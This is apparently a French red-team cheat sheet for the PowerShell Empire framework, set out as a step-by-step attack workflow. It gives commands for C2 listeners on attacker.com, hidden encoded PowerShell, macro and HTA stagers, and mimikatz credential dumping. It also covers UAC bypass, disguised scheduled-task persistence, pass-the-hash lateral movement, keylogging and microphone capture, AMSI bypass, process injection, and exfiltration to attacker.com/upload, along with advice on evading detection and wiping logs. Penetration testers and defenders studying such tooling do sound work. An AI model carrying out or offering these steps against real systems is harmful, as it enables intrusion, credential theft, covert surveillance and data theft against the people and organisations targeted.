# Empire - Framework Post-Exploitation PowerShell

## üóÇÔ∏è Workflow d'utilisation Empire
1. Installation et setup des listeners
   ‚Üì
2. G√©n√©ration des stagers/launchers
   ‚Üì
3. Ex√©cution sur la cible et r√©cup√©ration de session
   ‚Üì
4. Post-exploitation avec modules sp√©cialis√©s
   ‚Üì
5. Persistence et mouvement lat√©ral
   ‚Üì
6. Exfiltration et nettoyage des traces

## üìã Vue d'ensemble

Empire est un framework post-exploitation pure-PowerShell qui utilise des agents crypt√©s pour communiquer avec un serveur C2. Con√ßu pour √™tre furtif et difficile √† d√©tecter par les solutions de s√©curit√© traditionnelles.

> **üí° Explication Simple** : C'est comme avoir un agent secret invisible dans le syst√®me Windows qui peut ex√©cuter des commandes √† distance sans √™tre d√©tect√©, en utilisant uniquement PowerShell natif.

## ‚ö° Installation et Setup

### Installation Empire
```bash
# Clone du repository
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire

# Installation des d√©pendances
sudo ./setup/install.sh

# Lancement d'Empire
sudo python3 empire --rest
```

### Configuration initiale
```powershell
# D√©marrage du serveur Empire
./empire --rest --username admin --password password123

# Interface client
./empire --rest --username admin --password password123 --connect https://localhost:1337
```

## üéØ Listeners (Serveurs d'√©coute)

### HTTP Listener
```python
# Dans Empire console
uselistener http
set Host https://attacker.com
set Port 443
set DefaultProfile /admin/get.php,/news.php,/login/process.php
execute
```

### HTTPS Listener
```python
uselistener https
set Host https://attacker.com
set Port 443
set CertPath /path/to/cert.pem
set DefaultProfile /admin/get.php,/news.php
execute
```

### DNS Listener
```python
uselistener dns
set Domain attacker.com
set DomainFront cloudfront.net
execute
```

## üöÄ Stagers et Launchers

### PowerShell Launcher
```python
# G√©n√©ration launcher PowerShell
usestager multi/launcher
set Listener http
set OutFile launcher.ps1
generate

# Ex√©cution sur cible
powershell.exe -NoP -sta -NonI -W Hidden -Enc [BASE64]
```

### Macro Office
```python
# G√©n√©ration macro Office
usestager windows/macro
set Listener https
generate

# Int√©gration dans document Office
```

### HTA Launcher
```python
usestager windows/hta
set Listener http
set OutFile payload.hta
generate
```

### DLL Launcher
```python
usestager windows/dll
set Listener https
set Arch x64
generate
```

## üîß Gestion des Agents

### Interaction avec agents
```python
# Lister agents actifs
agents

# Interagir avec agent sp√©cifique
interact [AGENT_NAME]

# Informations agent
info

# Shell syst√®me
shell whoami
shell ipconfig /all
```

### Commandes agent de base
```python
# Dans session agent
sysinfo          # Infos syst√®me
ps               # Liste processus
downloads        # Fichiers t√©l√©charg√©s
upload file.exe  # Upload fichier
download file.txt # Download fichier
```

## üé≠ Modules Post-Exploitation

### Reconnaissance interne
```python
# √ânum√©ration r√©seau local
usemodule situational_awareness/network/arpscan
execute

# √ânum√©ration domaine
usemodule situational_awareness/network/get_domain_controller
execute

# √ânum√©ration utilisateurs
usemodule situational_awareness/network/powerview/get_user
execute
```

### Credential Harvesting
```python
# Dump hashes SAM
usemodule credentials/mimikatz/sam
execute

# Dump LSA secrets
usemodule credentials/mimikatz/lsadump
execute

# Dump LSASS
usemodule credentials/mimikatz/logonpasswords
execute

# Kerberoasting
usemodule credentials/powerview/get_user_spn
execute
```

### Escalade de privil√®ges
```python
# Bypass UAC
usemodule privesc/bypassuac_fodhelper
set Listener https
execute

# Escalade via service
usemodule privesc/powerup/service_exe_restore
execute

# Token impersonation
usemodule privesc/getsystem
execute
```

### Persistence
```python
# Registry persistence
usemodule persistence/userland/registry
set Listener https
execute

# Scheduled task
usemodule persistence/elevated/schtasks
set Listener https
set TaskName WindowsUpdate
execute

# WMI persistence
usemodule persistence/elevated/wmi
set Listener https
execute
```

### Lateral Movement
```python
# PSExec lateral movement
usemodule lateral_movement/invoke_psexec
set ComputerName target.domain.com
set Listener https
execute

# WMI lateral movement
usemodule lateral_movement/invoke_wmi
set ComputerName target.domain.com
set Listener https
execute

# Pass the Hash
usemodule lateral_movement/invoke_psexec_pth
set Hash [NTLM_HASH]
set ComputerName target.domain.com
execute
```

## üïµÔ∏è Modules d'Espionnage

### Keylogger
```python
usemodule collection/keylogger
set Sleep 5
execute
```

### Screenshot
```python
usemodule collection/screenshot
execute
```

### Surveillance clipboard
```python
usemodule collection/clipboard_monitor
execute
```

### Enregistrement audio
```python
usemodule collection/get_microphone
set Time 30
execute
```

## üåê Evasion et Obfuscation

### Obfuscation PowerShell
```python
# Module obfuscation
usemodule code_execution/invoke_obfuscation
set ScriptBlock "Get-Process"
set ObfuscationType Token
execute
```

### Bypass AMSI
```python
usemodule management/invoke_script
set ScriptPath /path/to/amsi_bypass.ps1
execute
```

### Process Injection
```python
usemodule code_execution/invoke_reflectivepeinjection
set PEPath /path/to/payload.exe
set ProcessID 1234
execute
```

## üìä Exfiltration de Donn√©es

### Exfiltration DNS
```python
usemodule exfiltration/exfil_dropbox
set LocalFile sensitive_data.txt
set DropboxAccessToken [TOKEN]
execute
```

### Exfiltration web
```python
usemodule exfiltration/exfil_via_http
set LocalFile data.zip
set URL https://attacker.com/upload
execute
```

## üîÑ Automatisation et Scripts

### Script automation
```python
# Chargement script personnalis√©
resource /path/to/empire_script.rc

# Contenu exemple script
uselistener https
set Host https://attacker.com
execute
agents
```

### API REST utilization
```python
import requests

# Authentification API
login_data = {'username': 'admin', 'password': 'password123'}
session = requests.post('https://localhost:1337/api/admin/login', json=login_data)

# Cr√©ation listener via API
listener_data = {
    'Name': 'https_api',
    'Host': 'https://attacker.com',
    'Port': '443'
}
requests.post('https://localhost:1337/api/listeners/https', json=listener_data)
```

## üõ°Ô∏è Conseils OPSEC

### Configuration s√©curis√©e
- Utiliser des profils de communication r√©alistes mimant le trafic l√©gitime
- Configurer des domaines frontaux (domain fronting) pour masquer l'infrastructure C2
- Employer des certificats SSL valides pour les listeners HTTPS
- Randomiser les intervalles de callback (jitter) pour √©viter la d√©tection

### Techniques furtives
- Utiliser des agents in-memory uniquement (pas de fichiers sur disque)
- Pr√©f√©rer les modules natifs PowerShell aux binaires externes
- Impl√©menter des kill dates pour auto-destruction des agents
- Nettoyer r√©guli√®rement les logs et traces d'activit√©

## ‚ö†Ô∏è Erreurs fr√©quentes

### Configuration
- Oublier de configurer des profils de communication cr√©dibles
- Utiliser des ports et protocoles suspicieux
- Ne pas impl√©menter de rotation des infrastructures C2
- Ignorer les indicateurs de d√©tection dans les logs

### Utilisation
- Lancer trop de modules simultan√©ment (g√©n√®re du bruit)
- Ne pas g√©rer correctement les privil√®ges des agents
- Oublier de nettoyer les artefacts apr√®s utilisation
- R√©utiliser les m√™mes payloads sur plusieurs cibles

## üí° Astuces

### Optimisation stealth
- Utiliser `sleep 60 30` pour randomiser les callbacks
- Configurer des profils malleable C2 personnalis√©s
- Employer des redirecteurs pour prot√©ger l'infrastructure principale
- Int√©grer Empire avec d'autres frameworks (Metasploit, Cobalt Strike)

### Techniques avanc√©es
- Combiner avec des techniques Living off the Land
- Utiliser l'injection de processus pour masquer l'activit√©
- Impl√©menter des canaux de communication de backup
- Cr√©er des modules personnalis√©s pour besoins sp√©cifiques

## üîó Pour aller plus loin

- [Empire Documentation](https://github.com/BC-SECURITY/Empire)
- [PowerShell Empire Guide](https://www.powershellempire.com/)
- [Malleable C2 Profiles](https://github.com/rsmudge/Malleable-C2-Profiles)
- [MITRE ATT&CK Empire Mapping](https://attack.mitre.org/)

## üß≠ Navigation

- [Guide Cobalt Strike](./Cobalt-Strike.md)
- [Guide Mimikatz](./Mimikatz.md)
- [Retour aux outils post-exploitation](./README.md)
- [Post-exploitation g√©n√©rale](../Guide-Post-Exploitation-Persistence.md) 